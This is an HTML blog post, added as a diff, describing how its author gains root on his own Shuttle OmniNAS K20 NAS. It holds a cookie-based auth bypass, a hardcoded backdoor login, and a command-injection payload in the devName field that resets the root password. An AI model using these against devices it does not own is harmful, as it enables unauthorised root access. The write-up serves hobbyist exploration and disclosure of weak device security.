@@ -1,0 +1,347 @@
+<!doctype html>
+<head>
+	<meta charset="UTF-8">
+	<meta content="width=device-width, initial-scale=1" name="viewport">
+	<title>Hacking the K20 | Alex Blackie</title>
+	<style>
+		body { max-width: 700px; line-height: 1.5em; }
+		h1, h2, h3, h4 { font-family: sans-serif; line-height: 1.2em; }
+		code { background: #efefef; padding: 1px 3px; font-size: 1.15em }
+		pre { background: #efefef; max-height: 500px; overflow: auto; padding: 10px; line-height: 1.3em; }
+		header { text-align: center }
+		figure { margin: 0; padding: 0; }
+	</style>
+</head>
+<body>
+	<header>
+		<h1>Hacking the Shuttle OmniNAS K20</h1>
+		<em>An exploration by Alex Blackie</em><br>
+		<em>Published <time>04 January 2015</time></em>
+	</header>
+
+	<hr>
+
+	<figure>
+		<img src="omninas.jpg" alt="Look at this beautiful piece of fuck" width="700" height="438">
+	</figure>
+
+	<p>
+		Christmas, 2013: through a crazy sale on my favourite technology
+		e-retailer I purchased a Shuttle OmniNAS K20, a consumer-grade NAS, for
+		~$70. The use-case was simple: a place for my mom to backup and view
+		her photo collection from anywhere in the house, instead of locked to
+		the iMac. Unfortunately, the low read and write speeds caused a great
+		deal of frustration, so into the closet it went.
+	</p>
+
+	<p>
+		In that closet it lay until today when I was reminded of it and decided
+		to see how deep into its firmware I could dive. I had a hunch it was
+		Linux-based, as the default filesystem was XFS, but no more than that
+		was known. I also knew is was slow and virtually useless for use as a
+		serious network storage device, so bricking it would be nothing more
+		than a shame.
+	</p>
+
+	<h2>Enabling SSH</h2>
+	<p>
+		My first quest was to get SSH access. Unfortunately, SSH is not a
+		setting generally available through the web UI, but the executable is
+		installed.
+	</p>
+
+	<p>
+		There's a set of debugging tools under <code>/admin</code> in the
+		webroot. They're "protected" through HTTP Basic Auth and a cookie.
+		Simply set the cookie and authentication will be skipped altogether.
+	</p>
+
+	<pre>document.cookie = "aton_nas_ssh=true"</pre>
+
+	<p>
+		Alternatively, the username/password combination of
+		<code>atonnas</code>/<code>backdoor</code> should work.
+	</p>
+
+	<p>
+		Click on "ssh" in the left frame, or go directly to
+		<code>/admin/ssh.php</code>, and check the box and save.  Our trusty
+		friend <code>nmap</code> can help verify SSH is actually now enabled.
+	</p>
+
+<pre>
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-01-03 15:13 PST
+Nmap scan report for 192.168.10.164
+Host is up (0.0043s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7 (protocol 2.0)
+[...]
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds</pre>
+
+	<p>
+		Excellent, so now we have SSH running, but we still don't have an
+		account to use with SSH.
+	</p>
+
+	<h2>Getting Root</h2>
+
+	<p>
+		I came across a couple forum posts and <a
+		href="http://asham.ca/hardware/2013/12/getting-root-and-sshd-on-boot-with-the-shuttle-omninas-kd20/">a
+		helpful blog post</a>, but having updated the firmware right away to
+		the latest version, the exploit used in the latter was no longer
+		viable. After much digging, I still couldn't find a way around it, so I
+		eventually just downloaded and flashed an older version of the firmware
+		(<code>2.35.x</code>) which still contained the vulnerability.
+	</p>
+
+	<p>
+		With the older firmware in place, I was able to reset the root password
+		and gain SSH access through a couple malformed requests to one of the
+		form endpoints, as mentioned in the aforementioned blog post.
+	</p>
+
+<pre>$.ajax({
+	type: "POST",
+	url: "http://192.168.10.164/action/healthy_action.php",
+	cache: false,
+	data: "devName=/dev/sda; (echo \"password\npassword\n\" | sudo passwd root)",
+	success: function(data) { console.log(data) }
+});</pre>
+
+	<p>
+		The endpoint you're hitting is a bridge to the <code>smartctl</code>
+		command, so a bunch of info about <code>/dev/sda</code> will be printed
+		to the console. If everything worked as expected, and <code>root</code>
+		should have the password <code>password</code>. You should now be able
+		to successfully get a shell.
+	</p>
+
+<pre>
+% ssh root@192.168.10.164
+root@192.168.10.164's password:
+
+BusyBox v1.10.3 (2013-11-06 11:05:30 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+OMNINAS-4BD382&gt;
+</pre>
+
+	<h2>Keeping SSH</h2>
+
+	<p>
+		Unfortunately, ticking the box in the backdoor settings doesn't persist
+		across reboots, which can be annoying. The fix is pretty simple,
+		however. Unfortunately <code>sshd_enable="YES"</code> doesn't work in
+		<code>rc.conf</code>, so we need to start it manually. Open
+		<code>/etc/rc</code> (<code>vi</code> is installed), and add the start
+		command somewhere near the bottom like so:
+	</p>
+
+<pre>
+[...]
+rm -rf /system/tmp/booting
+<span style="background: #fffaaa">
+# Start sshd
+/etc/rc.d/sshd.sh start
+</span>
+beep -l 300
+
+echo '.'
+
+echo ''
+
+date
+
+exit 0
+</pre>
+
+	<p>
+		I put the call right before the beep, so I have audible confirmation
+		that sshd started during the boot process.
+	</p>
+
+	<h2>In the Box</h2>
+
+	<p>
+		The included programs seems to be fairly standard faire, with some
+		gross custom shell scripts sprinkled around.
+	</p>
+
+<pre>
+OMNINAS-4BD382&gt; ls /usr/bin
+ENCRYPTMAC            env                   openvt
+PHP_alu               expr                  passwd
+PHP_filemtime         external-ip           php
+PHP_filesize          ffmpeg                phpbox
+PHP_filetype          ffprobe               pkill
+PHP_fread             ffserver              printf
+PHP_is_dir            find                  reboot.sh
+PHP_is_file           flash_eraseall        reset
+PHP_permission        free                  responder
+PHP_readfile          fuser                 setDataVolDefault.sh
+[                     gpio_handler          setminwest.sh
+[[                    halt.sh               sqlite3
+arping                hd_hotplug.sh         sudo
+awk                   hostid                surprise_remove.sh
+basename              htpasswd              tail
+beep                  httpd                 tee
+bunzip2               id                    test
+bzcat                 install               time
+bzip2                 killall               top
+chvt                  killall5              tr
+clear                 log4MP.sh             traceroute
+cmp                   logger                tty
+creat_file            mtdinfo               ubiattach
+crontab               nandwrite             ubidetach
+cut                   nmlddnsd              ubiformat
+ddns.sh               nslookup              upnp.sh
+deallocvt             ntfs-3g               upnpc
+diff                  ntpdate               uptime
+dirname               omninasd              utf16to8
+du                    openssl               wget
+
+OMNINAS-4BD382&gt; ls /usr/sbin
+chroot    crond     inetd     noflushd  telnetd   upnpd
+
+OMNINAS-4BD382&gt; ls /bin
+ad                   dmesg                ls                   sshd
+addgroup             dumpsexp             macusers             stat
+adduser              echo                 mkdir                stty
+afpldaptest          egrep                mknod                sync
+afppasswd            false                mount                tar
+apple_dump           fgrep                mv                   touch
+ash                  gpg-error            netatalk-config      transmission-cli
+busybox              gpg-error-config     netstat              transmission-create
+cat                  grep                 nice                 transmission-daemon
+chgrp                gunzip               ntfs-3g.probe        transmission-edit
+chmod                gzip                 pidof                transmission-remote
+chown                hmac256              ping                 transmission-show
+cnid2_create         hostname             ps                   umount
+cp                   inotifywait          pwd                  uname
+date                 inotifywatch         rm                   uniconv
+dbd                  ip                   rmdir                usleep
+dd                   kill                 sed                  vi
+delgroup             libgcrypt-config     sh                   zcat
+deluser              ln                   sleep
+df                   login                ssh-keygen
+
+OMNINAS-4BD382&gt; ls /sbin/
+afpd                losetup             mkswap              udevinfo
+arp                 loumount            modprobe            udevstart
+blockdev            lsmod               netatalk            udhcpc
+cnid_dbd            lvchange            parted              usb_id
+cnid_metad          lvconvert           partprobe           vgcfgbackup
+dhcpd               lvcreate            poweroff            vgcfgrestore
+dmsetup             lvdisplay           pvchange            vgchange
+dosfsck             lvextend            pvck                vgck
+e2fsck              lvm                 pvcreate            vgconvert
+fdisk               lvmchange           pvdisplay           vgcreate
+fsadm               lvmdiskscan         pvmove              vgdisplay
+getty               lvmdump             pvremove            vgexport
+halt                lvmsadc             pvresize            vgextend
+hdparm              lvmsar              pvs                 vgimport
+hotplug             lvreduce            pvscan              vgimportclone
+hwclock             lvremove            reboot              vgmerge
+ifconfig            lvrename            resize2fs           vgmknodes
+ifdown              lvresize            rmmod               vgreduce
+ifup                lvs                 route               vgremove
+init                lvscan              setsid              vgrename
+insmod              mDNSResponderPosix  sfdisk              vgs
+ipcrm               mdadm               smartctl            vgscan
+ipcs                mdmon               start-stop-daemon   vgsplit
+killall4            mkdosfs             swapoff             vol_id
+killall5            mke2fs              swapon              xfs_growfs
+klogd               mkfs.xfs            syslogd             xfs_quota
+lomount             mkntfs              udevd               xfs_repair
+</pre>
+
+	<p>
+		A quick look shows this to be an ARMv6 CPU.
+	</p>
+
+<pre>
+OMNINAS-4BD382&gt; cat /proc/cpuinfo
+Processor       : ARMv6-compatible processor rev 5 (v6l)
+processor       : 0
+BogoMIPS        : 299.00
+
+processor       : 1
+BogoMIPS        : 299.82
+
+Features        : swp half thumb fastmult edsp java
+CPU implementer : 0x41
+CPU architecture: 7
+CPU variant     : 0x0
+CPU part        : 0xb02
+CPU revision    : 5
+
+Hardware        : Oxsemi NAS
+Revision        : 0000
+Serial          : 0000000000000000
+</pre>
+
+	<p>
+		The RAM usage is pretty respectable, with the entire system only taking
+		~80MB of the total 256.
+	</p>
+
+<pre>
+OMNINAS-4BD382&gt; free
+              total         used         free       shared      buffers
+  Mem:       254020        79196       174824            0          672
+ Swap:      1048556            0      1048556
+Total:      1302576        79196      1223380
+</pre>
+
+	<p>
+		As expected, <code>top</code> shows that Apache is, in fact, the
+		largest consumer of RAM with Samba creeping up behind it.
+	</p>
+
+<pre>
+Mem: 79224K used, 174796K free, 0K shrd, 672K buff, 16988K cached
+Load average: 0.00 0.00 0.00
+  PID  PPID USER     STAT   VSZ %MEM COMMAND
+ 2375     1 root     S    13880   5% /usr/bin/httpd -f httpd.conf -d /etc
+ 2413  2375 nobody   S    13880   5% /usr/bin/httpd -f httpd.conf -d /etc
+ 1470     1 root     S     8868   3% /usr/hddapp/sbin/smbd -D -s /initrd/etc/sa
+ 1477  1470 root     S     8868   3% /usr/hddapp/sbin/smbd -D -s /initrd/etc/sa
+ 1485  1479 root     S     6872   3% //sbin/afpd -d -F //etc/afp.conf
+ 2637  2575 root     S     6668   3% sshd: root@ttyp0
+ 1467     1 root     S     4932   2% /usr/hddapp/sbin/nmbd -D -s /initrd/etc/sa
+ 1479     1 root     S     4652   2% /sbin/netatalk
+ 1486  1479 root     S     4416   2% //sbin/cnid_metad -d -F //etc/afp.conf
+ 2575     1 root     S     4056   2% /bin/sshd
+ 2639  2637 root     S     2256   1% -ash
+ 2880  2639 root     R     2256   1% top
+ 2346     1 root     S     2252   1% /usr/sbin/crond
+ 2511     1 root     S     2248   1% mdadm --monitor /dev/md1 --delay=5 --progr
+    1     0 root     S     2184   1% init
+ 1379     1 root     S     2184   1% /sbin/udhcpc -b -h OMNINAS-4BD382 -i eth0
+ 2616     1 root     S     2184   1% /sbin/getty 115200 ttyS0
+ 1499     1 root     S     2180   1% /bin/sh /etc/nasd
+ 2437     1 root     S     2180   1% sh /etc/cleanlogd
+ 2442     1 root     S     2180   1% sh /etc/cleanbklogd
+ 2447     1 root     S     2180   1% sh /etc/cleanafplogd
+</pre>
+
+	<h2>Hasty Conclusions</h2>
+
+	<p>
+		This is by no means an extensive guide, but I hope it's a means of
+		inspiration to go even farther than I have.
+	</p>
+
+	<p>
+		The security on this box is the scariest excuse for security I've ever
+		seen. The fact that there is a set username and password to access a
+		debug section that lists all the passwords in plain text, and can even
+		be fooled by setting a single cookie. I think my first act as the
+		now-root account will be to enact some proper security practices.
+	</p>
+</body>
